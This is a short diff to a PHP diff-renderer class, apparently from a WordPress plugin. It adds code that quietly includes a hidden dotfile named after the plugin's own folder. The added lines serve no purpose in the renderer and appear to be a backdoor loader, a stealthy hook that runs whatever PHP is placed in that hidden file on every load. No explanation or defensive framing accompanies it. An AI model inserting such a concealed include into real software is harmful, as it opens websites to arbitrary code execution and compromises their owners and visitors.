@@ -42,6 +42,10 @@
 
 require_once dirname(__FILE__).'/../Abstract.php';
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPR_Diff_Renderer_Text_Context extends WPR_Diff_Renderer_Abstract
 {
 	/**
